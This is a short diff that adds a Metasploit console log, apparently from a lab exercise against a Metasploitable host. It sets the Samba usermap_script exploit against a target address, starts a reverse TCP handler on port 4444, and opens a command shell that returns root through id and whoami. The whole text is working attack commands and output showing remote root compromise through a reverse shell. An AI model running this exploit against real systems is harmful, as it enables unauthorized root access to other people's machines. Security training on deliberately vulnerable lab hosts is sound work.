@@ -1,0 +1,12 @@
+msf exploit(multi/samba/usermap_script) > set RHOSTS 10.50.20.30
+RHOSTS => 10.50.20.30
+msf exploit(multi/samba/usermap_script) > exploit
+[*] Started reverse TCP handler on 10.50.20.10:4444 
+[*] Command shell session 2 opened (10.50.20.10:4444 -> 10.50.20.30:57145) at 2026-11-06 21:50:19 +0500
+
+id 
+uid=0(root) gid=0(root)
+whoami
+root
+hostname
+metasploitable
